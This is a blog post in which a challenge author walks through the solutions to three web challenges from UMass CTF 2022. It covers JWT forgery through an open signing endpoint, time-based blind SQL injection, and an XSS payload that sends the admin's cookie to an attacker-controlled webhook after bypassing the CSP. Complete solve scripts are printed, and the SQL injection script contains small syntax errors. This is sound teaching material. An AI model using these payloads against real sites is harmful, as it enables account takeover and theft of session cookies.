<!DOCTYPE html>
<html>
<link rel="stylesheet" href="../../resources/styles/dopestyle.css">

<head>
    <title>Jaquiez</title>
</head>

<body>
    <header>
        <nav class="navbar-all">
            <ul>
                <li><a href="/">Jaquiez</a></li>
                <li><a href="/Blog/">Blog</a></li>
                <li><a href="/Projects/">Projects</a></li>
                <li><a href="/Contact/">Contact</a></li>
            </ul>
        </nav>
    </header>
    <h1>
        UMASS CTF 2022 - April 2022
    </h1>

    <div id="post" style="display:table-cell; vertical-align:middle; text-align:center;  display: inline-block; /* shrink to fit */
    width: 100%;           /* whatever width you like */
    position: relative;    /* so .content can use position: absolute */">
        <p>
            UMASS CTF was this past weekend and I authored three web challenges: <a href="#AutoFlag">AutoFlag</a>, <a
                href="#Venting">Venting</a>, and <a href="#umassdining">umassdining</a>. You can click any of the challenge names to easily
            navigate to the summary and writeup.
        </p>
        <div id=AutoFlag>
            <h1 class="head">
                Autoflag
            </h1>
            <div>
                <p>
                    This challenge was based off a challenge that Akamai created for UMASS CTF. Originally, it was a jwt
                    token manipulation challenge that hinted at the secret token being "super-secret."
                    While this was an okay idea for a challenge, I decided to expand on the idea with some very basic
                    git foresnics and code review.
                    At the end of the competition it had 184 solves so I may have made it slightly easier than
                    anticipated. Below is my "official" writeup of the challenge.

                </p>

            </div>
            <img src="images/challenge1.png">
            <div>
                <p>
                    Upon opening the website we're greeted with the AutoFlag site giving us two buttons, one to get a
                    free flag and another to see the AutoFlag API.
                </p>
            </div>
            <img src="images/challenge1site.png" height="60%" width="60%">
            <div>
                <p>
                    Since everybody wants a free flag, let's just click that and get one!
                    This ends up with us getting redirected, and the site also makes some requests which we will inspect
                    later.
                </p>
            </div>
            <img src="images/challenge1redir.png" height="80%" width="80%">
            <div>
                <p>
                    After a few seconds, we are redirected to a page with a flag we don't want. A few more requests are
                    made so let's start looking at them. Also note, the file name is anonuserflag.png, this may hint
                    that there are other user flags to collect.
                </p>
            </div>
            <img src="images/dumbflag.png" height="70%" width="70%">
            <div>
                <p>
                    This first GET request we see is on /login where we see that a cookie is set.
                    This looks a lot like a JWT cookie, we can tell by the base64 "ey" which in ascii is "{"" aswell as
                    the three parts being seperated by dots. This follows the JWT structure of <code>{header}.{payload}.{signature}</code>
                    all of which are base64 and url-encoded.
                    So we know a JWT authentication is sent, this can be a possible vector of attack if we want to login
                    as another user.
                    Possible attacks you may be thinking of are a weak JWT secret or misconfiguration server side.

                </p>
            </div>
            <img src="images/request1.png" height="70%" width="70%">
            <div>
                <p>
                    Also in the request above we can see a javascript file is loaded called api.js.
                    We can open it up and see that in the source a comment is telling us that there is an 'admin' user
                    and we can see the
                    API source code changes on git. Interesting, let's check it out.
                </p>
            </div>
            <img src="images/scriptv2.png"width="80%" height="80%">
            <div>
                <p>
                    If we click the checkout the Autoflag API button on the main page we get a repository and see 4
                    commits.
                    One commit looks kind of interesting, let's click that.
                </p>
            </div>
            <img src="images/commits.png"width="80%" height="80%">
            <div>
                <p>
                    Checking out that commit we see a simple js script that created an unsigned token and signs it.
                    Tokens are signed by sending them in a post request to an "/api/sign-hmac" endpoint. Let's see if
                    this endpoint
                    is still open by sending a basic request to it.
                </p>
            </div>
            <img src="images/curl.png"width="80%" height="80%">
            <div>
                <p>
                    So putting this all together, we can sign any token with the secret on the server and we know
                    that there is a user called admin to impersonate. So we can change the user identity to admin
                    and authenticate on /flag. Here is my solve script below.
                </p>
            </div>
            <div style="text-align:left">
                <pre>
                    <code>
import base64
import json
import requests as r
r1 = r.get('http://34.148.103.218:4829/login')

val = r1.cookies.get('access_token_cookie')
val = str(val).split('.')

jwt_payload = base64.b64decode(val[1] + '==').decode('utf-8')
jwt_payload = json.loads(jwt_payload)
jwt_payload['sub'] = 'admin'
jwt_payload = json.dumps(jwt_payload)
jwt_payload = base64.b64encode(bytes(jwt_payload,'utf-8')).decode('utf-8').replace('=','')


payload = {"message":val[0] + '.' + jwt_payload}
r1 = r.post('http://34.148.103.218:4829/api/sign-hmac',data=payload)
token = val[0] + '.' + jwt_payload + '.' + r1.text.replace('=','')


headers = {
"Cookie":f"access_token_cookie={token}"
}
r1 = r.get('http://34.148.103.218:4829/flag',headers=headers)

print(r1.text)
                    </code>
                </pre>
                <code>UMASS{W0W_TH1$_1$_4_C00L_FL4G_BRUH!_69420}
                </code>
            </div>
            <div>
                <p>
                    In summary I think the challenge could have been made harder by obscuring some of the
                    code better in api.js such as making tokens with missing JTI claims and leaving them in the js.
                    This would probably force people to get their own unsigned token from /login, alter, and sign it.
                    However, this challenge was made 2 days before the competition (that's when Akamai sent it over) and
                    I'd say it is a solid improvement of what was previously given to us. Diclaimer: I had full consent
                    from Akamai to edit/revise the challenge as I saw fit.
                </p>
            </div>
        </div>
        <div id="Venting">
            <h1 class="head">
                Venting
            </h1>
            <div>
                <p>
                    The second challenge venting had less solves than AutoFlag yet more than most other challenges.
                    This challenge was made a few months before the CTF very quickly and not really touched again.
                    Out of these three first attempts at web challenges, this was the really the first challenge I made.
                    During the CTF this was hosted on one instance and sqlite3 only supports one connection at a time,
                    which on the first day caused some issues for players.
                </p>

            </div>
            <img src="images/challenge2.png"width="80%" height="80%">
            <div>
                <p>
                    So upon arrival we are given a form to fill out, none of the fields seem to be required though
                    so let's just click submit.
                </p>
            </div>
            <img src="images/sus.png"width="80%" height="80%">
            <div>
                <p>
                    When we check the sitemap after the initial request, we see several more redirects happen.
                    One of which has a redirect with some url paramaters including admin=False.
                </p>
            </div>
            <img src="images/sus2.png"width="80%" height="80%">
            <div>
                <p>
                    If we resend the request with URL paramters with admin=True, we are given a login screen.
                    When we press login we can see a POST request is sent with two form variables: user and pass.
                    When we send a basic response with user "admin" and any password, the response it "Invalid login".
                </p>
            </div>
            <img src="images/login.png"width="80%" height="80%">
            <div>
                <p>
                    From this we can assume that there is some sort of authentication bypass that we need to login as
                    admin.
                    A SQLi login bypass seems most likely and reading the html comments of the page also confirm that
                    sqlite3 is
                    running on the server to check requests. We can try a inject and we can see an error as well as the
                    full query being executed.
                    Aswell as our comments being replaced by some very sus unicode characters.
                </p>
            </div>
            <img src="images/sql.png"width="80%" height="80%">
            <div>
                <p>
                    Once we craft a successful payload without comments we can get a response from the admin
                    saying that there totally isn't anything in their password. If we want to take a look at it
                    regardless
                    we have to blindly enumerate through the user password. Some people used error based blind SQL
                    injections,
                    however my solution used a time based payload.
                    It ended up being a bit messy and slow even though I do a binary search
                    to lower the amount of requests I make, however it will eventually print the admin pass.
                </p>
            </div>
            <div style="text-align:left">
                <pre>
                    <code>

import requests as r;
import time;
target = input("Input target url below!\n")
payload= {
    user":"admin",
    "pass":"' UNION SELECT CASE WHEN(SUBSTR ((SELECT password FROM users WHERE username is 'admin'),1,1) is '1') THEN (82=LIKE('TROLLED',UPPER(HEX(RANDOMBLOB(2000000000/2))))) ELSE 1/0='a' END,'"
}
counter = 1
password = ""
low = 0
high = 128
lastval= 0
while(counter<50):
    value = (int)((low+high)/2);
    payload["pass"]="' UNION SELECT CASE WHEN(SUBSTR ((SELECT password FROM users WHERE username is 'admin'),{index},1) > CHAR({value})) THEN (82=LIKE('TROLLED',UPPER(HEX(RANDOMBLOB(2000000000/2))))) ELSE 1 END,'".format(index=counter,value=value)
    r1 = r.post(target+"/fff5bf676ba8796f0c51033403b35311/login",data=payload)
    if(r1.elapsed.total_seconds()>2):
        low = value
        value = (int)((low+high)/2)
    payload["pass"]="' UNION SELECT CASE WHEN(SUBSTR ((SELECT password FROM users WHERE username is 'admin'),{index},1) < CHAR({value})) THEN (82=LIKE('TROLLED',UPPER(HEX(RANDOMBLOB(2000000000/2))))) ELSE 1 END,'".format(index=counter,value=value)
    r1 = r.post(target+"fff5bf676ba8796f0c51033403b35311/login",data=payload)
    if(r1.elapsed.total_seconds()>2):
        high = value
        value = (int)((low+high)/2)
    payload["pass"]="' UNION SELECT CASE WHEN(SUBSTR ((SELECT password FROM users WHERE username is 'admin'),{index},1) is CHAR({value})) THEN (82=LIKE('TROLLED',UPPER(HEX(RANDOMBLOB(2000000000/2))))) ELSE 1 END,'".format(index=counter,value=value)
    r1 = r.post(target + "/fff5bf676ba8796f0c51033403b35311/login",data=payload)
    f(r1.elapsed.total_seconds()>2):  
        low = 0
        high = 128
        password = password + (chr)(value)
        counter = counter+1
        print(password)
                    </code>
                </pre>
            </div>
        <img src="images/script.png" width="80%" height="80%">
        <div>
            <p>
                Overall I think the challenge is okay. The main issue was challenge stability which could have
                been fixed by having multiple instances or at the very least multiple databases since there was only
                one single database connection allowed at once. In the future, I would probably try to include a full WAF
                with mulitple filters rather than just the password. For a first challenge, this is not too bad though.
            </p>
        </div>
        </div>
        <div id="umassdining">
            <h1 class="head">
                umassdining
            </h1>

        <div>
            <p>
                This was the hardest of the three challenges, both in number of solves and actually creating it.
                It's a simple XSS -> CSRF attack with an admin browser checking responses. However,
                to make it slightly harder I added a content security policy to only allow in-domain requests
                to occur. I did however, leave a relatively straight forward vector for attack in the site.
                Below I'll give a writeup including what someone who solved this challenge may have been thinking. 
            </p>
        </div>
        <img src="images/challenge3.png">
        <div>
            <p>
                The challenge description gives us a file to download and view some source in, let's check that out first
                before running it locally. We can see that there is a flask server running in main.py aswell as a bot.py file
                in the /bot/ directory. Working backwards, we can see the flag is given if we sent our authentication cookie to
                /join. However if we try to join normally we will be rejected.
            </p>
        </div>
        <img src="images/flagpossible.png">
        <div>
            <p>
                If we look for other occurences of <code>admin_cookie</code> in either
                file we find that in bot.py, a headless bot browser opens a request with 
                url paramaters <code>essay</code> and <code>email</code> to <code>/review/essay</code>.
                When looking closely at the source code for the <code>/review/essay/</code> endpoint 
                we can see that our essay is injected into a html document with the safe flag which
                disables autoescaping of characters when rendering our injecting variable into a template.
            </p>
        </div>
        <img src="images/inject1.png">
        <img src="images/inject2.png">
        <div>
            <p>
                Putting all our information together, we can craft an XSS payload  
                to exfiltrate an admin cookie over to our server and then authenticate 
                as them on <code>/join</code> to get an easy flag. Send a POST request with essay and 
                email in the form data and the bot will start working on another thread. So we send a basic
                payload <code>&lt;img src=1 onerror=fetch(`ourserver${document.cookie}`)&gt;</code>.
            </p>
        </div>
        <img src="images/register.png">
        <div>
            <p>
                And we recieve nothing back, our payload seems fine so let's open up the web tools console
                and try the javascript on the site. We see two big things: First off, our fetch request is being rejected
                due to Content Security Policy only allowing 'self'. If you decide to look furthur into Content Security Policy,
                you'll also see that all of our unsafe in-line payloads will be blocked. So is it impossible to exploit? Nope, the second 
                big thing we see is a strange message in console: <code>DOM content loaded for user</code> and it's 
                being initiated by a thing.js file.
            </p>
        </div>
        <img src="images/test.png" width="80%">
        <img src="images/big1.png">
        <div>
            <p>
                Checking out this file, it seems like a simple script that will wait
                for the DOM content of the site to be loaded before timing out. If you're not familiar
                with this javascript execution sink, you might be hinted by the content security policy 
                which for some reason allows 'unsafe eval'. Since we now know that the first parameter 
                of <code>setTimeout()</code> is an eval we can start crafting a string to break out of it.
            </p>
        </div>
        <img src="images/unsafejs.png">
        <div>
            <p>
                After some tampering your string should look something like:
                <code>hi');document.location='[YOUR SERVER]?value='%2Bdocument.cookie;//</code>.
                We're using <code>document.location</code> to force the admin on our site and steal the cookie,
                this is because changing <code>document.location</code> will tell the browser to load the string
                we assign to it. Finally we just have to send the full payload similar to how the 
                script is originally called on site. 
            </p>
        </div>
        <img src="images/ogscript.png">
        <div>
            <p>
                Below is the script to send a request to your webhook, aswell as the response
                we get on the webhook server.
            </p>
        </div>
        <div style="text-align:left">
            <pre>
                <code>
import requests as r 
url = input("Add you webhook URL\n")

data= {
    "email":"hellobozo@gmail.com",
    "essay":""
}
data['essay']="""&lt;script id='debug' src="/static/js/thing.js" data-iloveumass="hi');document.location=
'"""+url+"""?value='%2Bdocument.cookie;//">&lt;/script>"""
#or whatever ip ur hosting this on
r1=r.post("http://34.148.103.218:6942/register",data=data)
                </code>
            </pre>
        </div>
        <img src="images/resp.png">
        <div>
            <p>
                Finally we send our cookie as <code>auth=VEgxUzFTRDRTVVAzUlMzQ1IzVDRETTFOQzAwS0kzTDBMIQ</code>
                and get our flag <code>UMASS{NUMB3R_0N3_1N_$TUD3NT_D1N1NG_XD86543267!}</code>. Overall this challenge
                was a bit harder but I'd still put it at around beginner/intermediate difficiulty. I hope
                people learned a lot from this challenge, especially about how you should craft XSS payloads in a very
                limited environment. 
            </p>
        </div>
    </div>
    UMASS CTF as a whole was a great experience, I really enjoyed being a challenge author for a change
    and all the struggles that came with it. I noticed some mixed reactions with the web exploitation challenge,
    while most seemed to like them, others thought they were on the easier side. What I would change for next year 
    is to bring more difficult yet refreshing challenges in addition to those for beginner/intermediate players. If you made it to the end,
    you're super cool :)
</div>

</body>